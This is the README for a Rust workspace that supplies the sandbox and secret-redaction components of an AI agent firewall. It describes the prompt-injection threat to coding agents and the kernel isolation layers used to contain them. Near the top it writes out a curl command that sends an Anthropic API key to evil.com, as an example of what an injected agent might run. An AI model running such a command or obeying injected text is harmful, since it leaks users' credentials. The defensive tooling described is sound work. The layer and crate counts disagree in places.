# pipelock-rs

Rust implementation of security-critical components for [pipelock](https://github.com/luckyPipewrench/pipelock) — an open-source AI agent firewall.

---

## What is pipelock?

pipelock is an **AI agent firewall** written in Go. It sits inline between an AI agent (Claude Code, Cursor, OpenAI Agents, LangGraph, etc.) and the network, and enforces security policy on every outbound and inbound request.

The core problem it solves: your AI agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One prompt injection is all it takes:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
```

pipelock uses **capability separation** — the agent process has secrets but no direct network access; pipelock has network access but no agent secrets. Even if the agent gets prompt-injected, it can't reach the firewall's controls.

### What the Go implementation does

- **11-layer URL scanner** — scheme validation, CRLF injection, path traversal, domain blocklist, DLP (48 credential patterns), entropy analysis, SSRF with DNS rebinding prevention, rate limiting, data budgets
- **Response scanning** — 6-pass normalization pipeline catches zero-width characters, homoglyphs, leetspeak, base64-wrapped payloads; 25 injection patterns
- **MCP proxy** — bidirectional scanning of MCP stdio/HTTP/SSE/WebSocket traffic, tool poisoning detection, rug-pull detection, tool call chain detection
- **Process sandbox** — Landlock LSM + seccomp + network namespaces on Linux; sandbox-exec on macOS
- **Flight recorder** — BLAKE3 hash-chained JSONL evidence log with Ed25519-signed checkpoints
- **Kill switch** — emergency deny-all with 4 independent activation sources
- **Signed action receipts** — mediator-signed proof of what the agent did, verifiable outside the agent trust boundary
- **Security assessment** — 20-scenario attack simulation, config audit, deployment verification

It works with Claude Code, Cursor, VS Code, JetBrains, OpenAI Agents SDK, Google ADK, AutoGen, CrewAI, and LangGraph.

---

## Why does this Rust project exist?

The Go implementation is the primary product. This Rust workspace exists because **two specific subsystems benefit significantly from Rust** — not because we're rewriting everything.

### 1. The Sandbox (`pipelock-sandbox`)

The sandbox is the most security-sensitive component in pipelock. It wraps AI agent processes in multiple kernel-enforced isolation layers. In Go, fighting the runtime to call `clone(2)`, `unshare(2)`, and `execve(2)` in the right order — without the GC or goroutine scheduler interfering — is painful and fragile.

Rust gives us:
- Direct `libc` syscall access without a runtime in the way
- `pre_exec` hooks that run in the child after `fork()` but before `exec()`, exactly where namespace setup must happen
- A triple-fork pattern for PID namespace isolation that works correctly with Tokio's thread pool
- The type system to enforce that sandbox state transitions are one-way

The Rust sandbox implements **6 kernel-enforced isolation layers** that the Go sandbox cannot cleanly implement:

| Layer | Mechanism | What it blocks |
|---|---|---|
| Filesystem | Landlock LSM (ABI v1+) | Reads/writes outside the policy |
| Syscalls | Seccomp BPF (~130 allowed, ~400 blocked) | kexec, ptrace, mount, namespace escape, ... |
| Capabilities | PR_CAPBSET_DROP + capset | All Linux capabilities |
| User namespace | CLONE_NEWUSER | UID/GID privilege escalation |
| Network namespace | CLONE_NEWNET | Host network access |
| PID namespace | CLONE_NEWPID + double-fork | Host process visibility, /proc enumeration |
| Mount namespace | CLONE_NEWNS | Host filesystem mount table |

The Go binary invokes the Rust binary via re-exec: `pipelock sandbox <cmd>`. The Go side doesn't need to know about Landlock or seccomp internals — it just forks the Rust binary, which handles all the kernel-level isolation before exec'ing the agent command.

### 2. The `RedactedSecret` type (`pipelock-core`)

Go enforces "no agent secrets to disk" by convention. Rust enforces it at compile time. The `RedactedSecret` type:

- Zeroizes its bytes on drop (`zeroize` crate)
- Has no `Display`, `Debug`, or `Serialize` impl that exposes the bytes
- Serializes as `<pl:class:len>` placeholders in audit logs and receipts
- Exposes bytes only through a scoped closure: `secret.with_bytes(|b| ...)`

The compiler proves that a secret can never reach a logger, recorder, or wire format. This invariant is impossible to accidentally break. The design is being ported back to Go as a pattern (not a dependency).

---

## How the two projects connect

```
┌─────────────────────────────────────────────────────────────────┐
│  pipelock (Go) — primary product                                │
│                                                                 │
│  11-layer URL scanner, MCP proxy, response scanning,           │
│  kill switch, flight recorder, signed receipts, assessment     │
│                                                                 │
│  pipelock sandbox --config pipelock.yaml -- python agent.py    │
│         │                                                       │
│         │  re-exec (fork + exec)                               │
│         ▼                                                       │
│  pipelock-rs (Rust) — security-critical subsystems             │
│                                                                 │
│  pipelock-sandbox: 6-layer kernel isolation                    │
│  pipelock-core: RedactedSecret type                            │
│  pipelock-proxy: HTTP forward proxy (MVP)                      │
│  pipelock-scanner: URL scanner (MVP)                           │
│  pipelock-recorder: BLAKE3 hash-chained log (MVP)             │
└─────────────────────────────────────────────────────────────────┘
```

The two implementations are **not linked at runtime as libraries**. The Go binary shells out to the Rust binary for sandboxed execution. The Rust binary can also be used standalone.

The Rust workspace also serves as a foundation for a future full port if/when the Go implementation reaches its limits — but that is not the current goal.

---

## What's in this repo

This is a Cargo workspace with 27 crates. The production-ready components are:

| Crate | Status | Description |
|---|---|---|
| `pipelock-sandbox` | ✅ Complete | 6-layer process isolation (Landlock + seccomp + namespaces) |
| `pipelock-core` | ✅ Complete | Shared types: `Verdict`, `Finding`, `RedactedSecret` |
| `pipelock-scanner` | ✅ Complete | URL scanner: length, scheme, CRLF, traversal, DLP, SSRF |
| `pipelock-proxy` | ✅ Complete | HTTP forward proxy with scan-on-request |
| `pipelock-recorder` | ✅ Complete | Append-only JSONL with BLAKE3 hash chain |
| `pipelock-config` | ✅ Complete | YAML config loader |
| `pipelock-audit` | ✅ Complete | Structured audit events |

The remaining 20 crates (`pipelock-mcp`, `pipelock-rules`, `pipelock-signing`, etc.) have correct type signatures and compile cleanly but contain no real implementation yet. They define the workspace structure for future work.

---

## Quickstart

```bash
# Build everything
cargo build --workspace

# Scan a URL (no proxy needed)
cargo run -p pipelock -- check --url 'https://example.com/?key=AKIAIOSFODNN7EXAMPLE'

# Start the HTTP forward proxy
cargo run -p pipelock -- run --config examples/pipelock.yaml

# Route traffic through it
curl -x http://127.0.0.1:9999 https://docs.python.org/3/
curl -x http://127.0.0.1:9999 'https://x.example.com/?k=sk-ant-abcdefghijklmnop'
```

## Using the sandbox

```bash
# Run a command inside the sandbox (best-effort mode)
cargo run -p pipelock -- sandbox echo "Hello from sandbox"

# Run a shell command
cargo run -p pipelock -- sandbox sh -c 'echo test > $TMPDIR/out.txt && cat $TMPDIR/out.txt'

# Strict mode (fails if any layer unavailable)
cargo run -p pipelock -- sandbox --strict echo "Hello"
```

The sandbox output shows which layers are active:

```
[sandbox] capabilities: DROPPED
[sandbox] pid: ACTIVE (PID 2, isolated namespace, /proc remounted)
[sandbox] filesystem: ACTIVE (Landlock)
[sandbox] rlimits: ACTIVE
[sandbox] syscall: ACTIVE (seccomp)
[sandbox] network: ACTIVE (isolated namespace)
[sandbox] mount: ACTIVE (isolated mount namespace)
[sandbox] pid: ACTIVE (isolated PID namespace, double-fork)
[sandbox] containment: 6/6 layers active
```

## Running tests

```bash
# All tests
cargo test --workspace

# Sandbox integration tests (must run serially — namespace isolation)
cargo test -p pipelock-sandbox -- --test-threads=1
```

## Requirements

- Linux kernel 5.13+ (for Landlock ABI v1)
- Rust 1.80+
- User namespaces enabled for full isolation: `sysctl kernel.unprivileged_userns_clone=1`

## Workspace layout

```
pipelock-rs/
├── Cargo.toml              # workspace root
├── Cargo.lock
├── examples/
│   └── pipelock.yaml       # example config
└── crates/
    ├── pipelock/           # binary (CLI entry point)
    ├── pipelock-core/      # Verdict, Finding, RedactedSecret
    ├── pipelock-config/    # YAML loader
    ├── pipelock-scanner/   # URL scanner pipeline
    ├── pipelock-recorder/  # BLAKE3-chained JSONL evidence log
    ├── pipelock-audit/     # audit event emitter
    ├── pipelock-proxy/     # HTTP forward proxy
    ├── pipelock-sandbox/   # Linux process isolation (the main reason this exists)
    └── pipelock-*/         # 19 scaffolding crates for future work
```

## License

Apache-2.0 — see [`LICENSE`](./LICENSE). Same license as the core of the Go implementation.

## Related

- [pipelock (Go)](https://github.com/luckyPipewrench/pipelock) — the primary product
- [pipelab.org](https://pipelab.org) — documentation, guides, and blog
- [GOVERNANCE.md](https://github.com/luckyPipewrench/pipelock/blob/main/GOVERNANCE.md) — project leadership and contribution policy
- [SECURITY.md](https://github.com/luckyPipewrench/pipelock/blob/main/SECURITY.md) — vulnerability reporting
